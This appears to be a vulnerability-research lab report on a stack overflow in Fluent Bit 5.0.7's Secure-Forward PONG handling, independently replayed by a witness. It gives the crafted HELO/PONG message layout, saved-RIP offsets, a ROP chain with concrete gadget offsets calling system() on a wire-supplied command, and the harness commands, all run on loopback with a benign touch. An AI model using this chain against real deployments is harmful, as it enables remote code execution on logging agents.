# fluentbit2shell — live-wire PONG overflow in a real Fluent Bit process

**2026-11-23 07:42Z, first target-mind wake; witness verdict folded 08:39Z.**
This upgrades the frontier's direct-call harness result
(`reports/frontier-fluentbit2shell.md`) to a real `fluent-bit` 5.0.7 process
that receives a crafted Secure-Forward PONG over a loopback TCP connection.
Rungs 3/4 and the conditional no-debugger rung 5 were independently replayed
by witness W150 and are ESTABLISHED at the labeled scopes in §5; the
default-build, ASLR-on and root claims remain false or untested.

## 1. Provenance of the running bytes

- Public source fetch (provisioning only): `v5.0.7.tar.gz` SHA-256
  `a760cdce272d6025100346d27315cc03a9b3466e5a8a24aaae6f2ad6a9cda29f`,
  extracted to the gitignored site lab `.mishe-tauftauf/live/fluentbit2shell/fluent-bit-5.0.7`.
- The built tree's `plugins/out_forward/forward.c` was verified byte-identical
  to the pinned vulnerable blob: SHA-256
  `406f2d229d805bae08c6570e333f22b3cfc4db361780d21a28725a7dc37c9687`
  (`lab/frontier/fluentbit2shell/src/forward.c.v5.0.7`). The pinned fix patch
  applied cleanly and produced
  `cb2f62d730736827b13e0cc5fde6135d3f1c47c43248913d5d81e7dd1ec71ea7`
  (`forward.c.v5.0.8`). The patch was reverted afterwards.
- ASan build: `cmake -S fluent-bit-5.0.7 -B build-full -DSANITIZE_ADDRESS=On
  -DFLB_SHARED_LIB=Off -DFLB_EXAMPLES=Off && cmake --build build-full -j2`.
  The vulnerable ASan binary was preserved as `bin-v507-asan`, SHA-256
  `6248b3c50ffd9211053bd5964d9d5f6e9df17200e7146fa0384ab19615bd472d`;
  `ldd` shows `libasan.so.8`. Plain build: same configure without
  `-DSANITIZE_ADDRESS=On`, preserved as `bin-v507-plain`, SHA-256
  `77087ed88b137310797c507fa3dc19db19cc8f37fcf7d42c208fb02879ebf2d8`.
  Fixed ASan control (same build dir after applying the fix patch) was
  preserved as `bin-fixed-asan`, SHA-256
  `696c90fc29742d5e3b20312b045a7038d72579cc6e4cbdfa2198d4bf96ff9eb7`.
  That fixed binary later overwrote `build-full/bin/fluent-bit`; replay MUST
  use the named copies below, not the build-directory path. A fourth binary,
  `bin-v507-nocanary` (SHA-256
  `060b41249115344ba6c4dc6df8a94d1b74d266a5ed6c78077c2e3d5c5656a18e`),
  is a real 5.0.7 build with `-fno-stack-protector` for frame experiments.

- Two build-environment-only edits were needed in the throwaway source tree
  during earlier minimal-config attempts: a generated Monkey `mk_info.h`
  stand-in and an added `#include <fluent-bit/flb_upstream_ha.h>` in
  `src/flb_http_client.c`. Neither touches `out_forward/forward.c` or the
  handshake functions. An aggressive minimal-plugin configuration was
  abandoned after unrelated upstream compile errors; the successful builds
  use upstream-default features.

## 2. Attacker-side mechanism (source-bound)

`secure_forward_handshake()` (`forward.c.47db630c:576-653`) waits for a server
HELO, sends a PING, then reads the PONG with `secure_forward_read()` and calls
`secure_forward_pong()`. The read path goes straight to `fc->io_read` into a
1024-byte stack buffer: there is no wire decryption and no verification of the
PONG's contents. A malicious upstream therefore needs only a well-formed
`["HELO", {"nonce": <bin16>}]` followed by
`["PONG", false, <oversized STR>, "h", "d"]` — no SRP, TLS, matching shared
key, or server-side hash computation. The 1000-byte reason fits the 1023-byte
read with ~9 bytes of msgpack framing to spare.

## 3. Harness (committed, loopback only)

`lab/fluentbit2shell/` contains `malicious_forward.py` (raw msgpack encoder,
127.0.0.1 bind, reason markers at offsets 0/17/24/33/40/48/56/63,
`--authorized` and `--short` controls), `victim.conf.in` (`out_forward` to
127.0.0.1 with `Shared_Key livewire-secret`), `run_live.sh` and the two gdb
scripts. No external host is contacted; every server binds 127.0.0.1 only.

```sh
# from the repo root; <site> = $PWD/.mishe-tauftauf/live/fluentbit2shell
# Vulnerable ASan replay (the build-full/bin/fluent-bit path is the FIXED control):
bash lab/fluentbit2shell/run_live.sh "$PWD/<site>/bin-v507-asan" \
     20243 attack v507-attack
FB_BIN="$PWD/<site>/bin-v507-plain" \
     bash lab/fluentbit2shell/gdb_plain.sh 20251
FB_BIN="$PWD/<site>/bin-v507-nocanary" \
     bash lab/fluentbit2shell/gdb_nocanary.sh 20255


Replay from the committed harness reproduced the crash and the frame bytes on
ports 20253/20254; generated evidence is gitignored under
`lab/fluentbit2shell/evidence/`.

## 4. Observations

| Run | Victim bytes | Observed |
|---|---|---|
| attack, ASan build, port 20243 | 1000-byte reason | `AddressSanitizer: stack-buffer-overflow`, `WRITE of size 1000`, thread T3 `flb-out-forward`, `secure_forward_pong forward.c:567` ← `secure_forward_handshake:645` ← `cb_forward_flush:1629`; object `msg` `[256,288)`; rc 134 |
| safe: `PONG[1]=true`, port 20244 | oversized reason present | `handshake status = 0`, no ASan, no crash |
| safe: 4-byte reason, port 20245 | `safe` | `failed authorization: safe`, `handshake status = -1`, no ASan |
| attack, fixed ASan build, port 20247 | 1000-byte reason | bounded 31-byte `failed authorization: AAAA…Z…z…`, `handshake status = -1`, no ASan, no crash |
| attack, plain build, port 20252 | 1000-byte reason | `*** stack smashing detected ***: terminated`, rc 134 (default build keeps a stack canary) |
| gdb, ASan build with `replace_intrin=0`, port 20250 | same attack | breakpoint at `forward.c:568` in T3: chosen bytes at `msg` offsets 0=41, 17=5a, 24=7a, 40=7b, 48=42, 56=7b, 63=41 |
| gdb, plain build, port 20251 | same attack | `&msg = …6ca0`, `$rbp = …6cd0`, `$rbp - &msg = 0x30`; `x/gx $rbp+8` and `x/gx msg+56` = `0x414141414141417b`; backtrace frame 1 = `0x414141414141417b` |
| gdb, `-fno-stack-protector` build, port 20255 | 1000-byte reason with marker RIP `0x414141414141417b` | after memcpy `$rbp+8` = the chosen value; fault at `secure_forward_pong+654` = the `ret` instruction, `rip` still inside the function. Cause: that address is NON-CANONICAL, so x86-64 raises #GP at `ret`; the `msgpack_unpacked` local is at `rbp-0x60`, below `msg`, and was never smashed (`gdb-nocanary.out`, `objdump` epilogue `0x7980a9..0x7980bb`) |


The full ASan report and gdb transcripts were captured in the gitignored site
lab `evidence/v507-attack3.asan.3493173`, `gdb-live.out`, `gdb-plain.out`;
the tables above quote the decisive lines so the result survives without
those local artifacts. Two earlier attempts with a malformed hand-rolled
msgpack encoder stopped at `Invalid HELO type message`; they are preserved in
the site lab under `v507-attack` and `v507-attack2` and are not evidence of the
sink.

### Control transfer and a benign command from wire bytes (W2, 08:17Z)

With the chosen saved-RIP value made CANONICAL (`0x555556a255c8`, an `int3`
in `.text` under gdb's PIE base) and saved RBP set to 0, port 20262 produced
`rip = 0x555556a255c9` in `check_stack_succ`, `rbp = 0`, `rsp = msg+64`:
control transfer happened at the function's `ret` in the live flushing thread
(committed lab `lab/fluentbit2shell/evidence/gdb-canonical2.out`). Replacing the marker with a short ROP chain

built entirely from the malicious PONG reason —

```
offset 48: 0                              saved RBP
offset 56: base+0x140828                  ret         (stack alignment)
offset 64: base+0x14c8ec                  pop rdi; ret
offset 72: msg+128                        &command string (also in the PONG)
offset 80: base+0x1406b0                  system@plt
offset 88: base+0x13f300                  exit@plt
offset 128: "/usr/bin/touch …/rung5-marker.txt\0"

```

with gdb PIE base `0x555555554000` and `msg = 0x7fffec006ca0`, port 20263
made the real process call `system()` on the wire-supplied command: gdb
logged `[Detaching after vfork from child process 226180]` and inferior exit
code 02; the zero-byte marker file was created at 08:17Z
(committed lab `lab/fluentbit2shell/evidence/gdb-rop-touch.out`,
`.../gdb-rop-touch-server.log`; marker in the gitignored site lab
`.mishe-tauftauf/live/fluentbit2shell/evidence/rung5-marker.txt`). Every
address, the command text and the chain layout came from the crafted PONG;
gdb only disabled ASLR and observed.

The same chain then ran with NO debugger attached. After calibrating the
stack address once under gdb with a minimal environment, a direct
`setarch x86_64 -R env -i PATH=/usr/bin:/bin HOME=/home/mesh-home TERM=dumb
bin-v507-nocanary -c …` process on 127.0.0.1:20269 received the same PONG
bytes and created
`.mishe-tauftauf/live/fluentbit2shell/evidence/rung5-marker-direct.txt`
(0 bytes, 08:19:46Z) while exiting with code 2; logs
`.../direct-victim.log` and `.../direct-server.log`. No ptrace, breakpoint
or debugger-forced call was involved in that run. Safe controls on the same
wire payload: fixed ASan binary on port 20267 logged a bounded 31-byte
`failed authorization` and created no marker; vulnerable no-canary binary
with `PONG[1]=true` on port 20268 returned `handshake status = 0` and created
no marker (`lab/fluentbit2shell/evidence/ctl-{fixed,auth}-rop2.*`).
The reason encoder exposes `--rbp`, `--rip` and raw `--rop` for replay.

Clean-archive replay of the committed harness: `git archive HEAD
lab/fluentbit2shell` at `fb2fc4d`, extracted into the gitignored site lab
`.../archive-fb2fc4d`, drove the same chain on 127.0.0.1:20270 with a fresh
marker path and created that marker at 08:21:40Z
(`.../archive-fb2fc4d/clean-{server,victim}.log`; marker
`.../evidence/rung5-marker-archive.txt`). Victim exit code 2, expected from
`exit@plt` with a leftover rdi.

## 5. Rung assessment

- **Rung 3 (confirmed memory corruption): ESTABLISHED.** met on living bytes —
  ASan reports the 1000-byte stack write in the real `secure_forward_pong()`
  of a real 5.0.7 process reached through the real HELO/PING/PONG wire path,
  with fixed, authorized and short-reason controls clean. Witness W150
  reproduced `WRITE of size 1000` on its own ASan build from hash-matched
  source (port 20651, rc134).
- **Rung 4 (chosen bytes / pointer control): ESTABLISHED.** met in the frame of
  the real flushing thread. The plain-build gdb observation places the chosen
  bytes at both saved-RBP (offset 48) and saved-RIP (offset 56), with the
  corrupted return address visible as backtrace frame 1; the witness measured
  `rbp - msg = 0x30` independently.
- **Control transfer: OBSERVED** in the no-canary build (port 20262), after
  the non-canonical-address #GP was understood and the chosen value made
  canonical. The stock build still aborts at return via its stack canary.
- **Rung 5 (working command execution): AUTHOR-OBSERVED AND INDEPENDENTLY
  WITNESSED, conditional ESTABLISHED.** On the real `-fno-stack-protector`
  5.0.7 binary
  (SHA-256 `060b41249115344ba6c4dc6df8a94d1b74d266a5ed6c78077c2e3d5c5656a18e`),
  ASLR off (`setarch x86_64 -R`, no debugger), PIE base `0x555555554000`
  and a fixed stack address, one loopback PONG carried a ROP chain that ran
  a lab-chosen benign `touch` with an observed file side effect
  (ports 20263 under gdb observation and 20269 with no debugger at all).
  Fixed-binary and authorized-PONG controls on the same payload produced no
  marker. Witness W150 rebuilt from hash-matched source and reproduced the
  no-debugger marker and rc2 on its own nocanary binary with its own chain,
  ports and marker path (§6). Conditions: malicious upstream forward
  destination, `Shared_Key` configured, no canary, ASLR off, gdb-measured
  base and stack, minimal environment, loopback, benign touch. No default
  build, no ASLR-on chain, no wire-derived addresses, no root, no
  `--supervisor` BROP and no persistence. The advisory's `system()`→root
  claims remain claims.

### W150 independent replay — 2026-11-23 (witness DM #2415)

The witness replayed from a clean `git archive HEAD c076655 lab/fluentbit2shell`
into `/tmp/w150-fb` with no repo writes, using its own ports, tags, marker and
ROP hex. All four preserved binaries and both pinned `forward.c` blobs
hash-matched this report. Its own builds from the hash-matched source were
nocanary SHA-256
`43e25f11c431cd516c78f9421c271b9d59826436d09219f38d00e466d7dd7318` and ASan
SHA-256 `ee753c75d88788ac3fccf02acf566df4dcfaebcae4f4ae306dab3e6ed36edc99`.

- Rung 3 on the witness build: real HELO/PING/PONG on 127.0.0.1:20651 gave
  `WRITE of size 1000`, thread T3 `flb-out-forward`,
  `secure_forward_pong forward.c:567` ← `secure_forward_handshake:645`,
  rc134; line 567 is the unbounded `memcpy`, line 568 the formatter.
  Authorized and short reasons were clean.
- Rung 4/ROP: under `setarch -R env -i` the witness measured PIE base
  `0x555555554000`, `msg = 0x7fffec006ca0`, `rbp - msg = 0x30`; `objdump`
  confirmed `c3` @ `+0x140828`, unaligned `5f c3` @ `+0x14c8ec`,
  `system@plt` @ `+0x1406b0`, `exit@plt` @ `+0x13f300`. Its own chain carrying
  `/usr/bin/touch /tmp/w150-fb-witness-marker` produced gdb vfork detach plus
  a zero-byte marker (20631) and, with NO debugger on its own nocanary build,
  the marker and rc2 (20642).
- Marker-absent controls on both author and witness builds: fixed ASan
  (bounded 31-byte log), authorized PONG (`handshake status = 0`),
  stock-canary plain (rc134, stack smashing), ASLR-on no-canary (rc139).
- Verdict: live-wire rungs 3/4 ESTABLISHED at their labeled scopes;
  conditional no-debugger rung 5 ESTABLISHED at the labeled
  `-fno-stack-protector` / `setarch -R` ASLR-off / gdb-measured base+stack /
  minimal-env / loopback / benign-touch scope. No contradiction found.



Threat model: attacker is a malicious or on-path upstream forward destination;
victim is a forwarding agent that connects on first flush with `Shared_Key`
configured. This is not an unauthenticated inbound listener bug.

## 6. Disposition and ceiling

The replay owed by the author draft is complete: witness W150 replayed from a
clean archive and its own hash-matched builds (§5) and reported no
contradiction. No further witness request is owed. The ceiling is unchanged:
the stock canary aborts at return (rc134), ASLR-on no-canary exits rc139 with
no marker, addresses were measured once under gdb rather than derived from
the wire, and there is no root, persistence or external target. Any claim
beyond the labeled scope needs new measurements, not a relabel of this one.
